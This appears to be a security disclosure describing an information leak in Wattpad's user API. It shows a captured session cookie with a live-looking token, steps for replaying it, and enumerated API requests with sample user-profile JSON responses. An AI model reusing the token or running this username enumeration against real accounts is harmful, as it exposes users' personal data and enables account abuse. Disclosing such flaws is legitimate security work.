# About Wattpad Website Information Disclosure Security Vulnerability Description

## 1 Security vulnerability implementation steps 
### 1.1 Get Header request data
Intercept browser Cookie information after logging in by a valid user.
```
Cookie: wp_id=d009d7cb-9041-46a2-a004-826cff01b7aa; lang=1; _ga=GA1.1.500116561.1711539863; _fbp=fb.1.1711539863586.1786727445; _pbjs_userid_consent_data=3524755945110770; _sharedid=014ee592-f8dd-4993-9741-7f62da71246c; g_state={"i_p":1711547080940,"i_l":1}; fbm_2582347323=base_domain=.wattpad.com; locale=en_US; token=462965140%3A2%3A1711540226%3AqEeVSRSqDk_yvPXvHza9uN6vVIzhpiObJWVy14c87omxtPE1FmQRnwruVFKFzezR; ff=1; dpr=1; tz=-8; X-Time-Zone=Asia%2FShanghai; hc=2024-03-27T11%3A50%3A28.645Z; seen-wallet-onboard=1; isStaff=1; _ga_FNDTZ0MZDQ=GS1.1.1712101115.3.0.1712101115.0.0.0; te_session_id=1712101115137; RT=nu=https%3A%2F%2Fwww.wattpad.com%2Fuser%2FShionYg&cl=1712101219873

```

### 1.2 Add cookie to the replay attack HTTP Request Header

## 2 Disclosure of user information by replay attack

> Leaked information includes: username, creation date, facebook

> Request method: GET, information can be obtained by traversing the constructed username, such as "ShionYg", "mahamaha"...

API URL\application unit and request parameters of verified project information leakage are shown in the following table:

| authenticated user | API URL | Request params|
|---------|---|---|
| ShionYg |https://www.wattpad.com/api/v3/users/ShionYg?fields=username%2Cname%2Cdescription%2Cavatar%2CbackgroundUrl%2CcreateDate%2Clocation%2Cfollowing%2CfollowingRequest%2CnumFollowing%2Cfollower%2CfollowerRequest%2CnumFollowers%2CnumLists%2CnumStoriesPublished%2CvotesReceived%2Cfacebook%2Ctwitter%2Cwebsite%2Csmashwords%2Chighlight_colour%2Chtml_enabled%2Cverified%2Cambassador%2Cwattpad_squad%2Cis_staff%2CisPrivate%2CisMuted%2CexternalId%2Cnotes%2Csafety(isMuted%2CisBlocked)|fields=username%2Cname%2Cdescription%2Cavatar%2CbackgroundUrl%2CcreateDate%2Clocation%2Cfollowing%2CfollowingRequest%2CnumFollowing%2Cfollower%2CfollowerRequest%2CnumFollowers%2CnumLists%2CnumStoriesPublished%2CvotesReceived%2Cfacebook%2Ctwitter%2Cwebsite%2Csmashwords%2Chighlight_colour%2Chtml_enabled%2Cverified%2Cambassador%2Cwattpad_squad%2Cis_staff%2CisPrivate%2CisMuted%2CexternalId%2Cnotes%2Csafety(isMuted%2CisBlocked)|
| Mahamaha |https://www.wattpad.com/api/v3/users/MahaMaha?fields=username%2Cname%2Cdescription%2Cavatar%2CbackgroundUrl%2CcreateDate%2Clocation%2Cfollowing%2CfollowingRequest%2CnumFollowing%2Cfollower%2CfollowerRequest%2CnumFollowers%2CnumLists%2CnumStoriesPublished%2CvotesReceived%2Cfacebook%2Ctwitter%2Cwebsite%2Csmashwords%2Chighlight_colour%2Chtml_enabled%2Cverified%2Cambassador%2Cwattpad_squad%2Cis_staff%2CisPrivate%2CisMuted%2CexternalId%2Cnotes%2Csafety(isMuted%2CisBlocked)|fields=username%2Cname%2Cdescription%2Cavatar%2CbackgroundUrl%2CcreateDate%2Clocation%2Cfollowing%2CfollowingRequest%2CnumFollowing%2Cfollower%2CfollowerRequest%2CnumFollowers%2CnumLists%2CnumStoriesPublished%2CvotesReceived%2Cfacebook%2Ctwitter%2Cwebsite%2Csmashwords%2Chighlight_colour%2Chtml_enabled%2Cverified%2Cambassador%2Cwattpad_squad%2Cis_staff%2CisPrivate%2CisMuted%2CexternalId%2Cnotes%2Csafety(isMuted%2CisBlocked)	|


### Leaked packet cases 
ShioYg:
``` {
"username": "ShionYg",
"avatar": "https://img.wattpad.com/useravatar/8.128.jpg",
"isPrivate": false,
"backgroundUrl": "",
"follower": false,
"following": false,
"safety": {
     "isMuted": false,
     "isBlocked": false
},
"name": "******",
"description": "",
"createDate": "2024-0*-0*T11:05:16Z",
"location": "",
"verified": false,
"ambassador": false,
"facebook": "*******************",
"twitter": "",
"website": "",
"smashwords": "",
"votesReceived": 0,
"numStoriesPublished": 0,
"numFollowing": 0,
"numFollowers": 0,
"numLists": 2,
"isMuted": false,
"is_staff": false,
"highlight_colour": "#E04006",
"html_enabled": false,
"wattpad_squad": false,
"externalId": "25d1868770f7cb19a1bdef8de8ddc75892533b68"
```
mahamaha:
``` {
"username": "mahamaha",
"avatar": "https://img.wattpad.com/useravatar/5.128.jpg",
"isPrivate": false,
"backgroundUrl": "",
"follower": false,
"following": false,
"followerRequest": "",
"followingRequest": "",
"safety": {
    "isMuted": false,
    "isBlocked": false
},
"name": "",
"description": "",
"createDate": "2012-0*-**T12:37:06Z",
"location": "",
"verified": false,
"ambassador": false,
"facebook": "",
"twitter": "",
"website": "",
"smashwords": "",
"votesReceived": 0,
"numStoriesPublished": 0,
"numFollowing": 2,
"numFollowers": 0,
"numLists": 0,
"isMuted": false,
"is_staff": false,
"highlight_colour": "#A36E24",
"html_enabled": false,
"wattpad_squad": false,
"externalId": "ea3503a262fd29260b62b12950950af3ec5b28f7"
```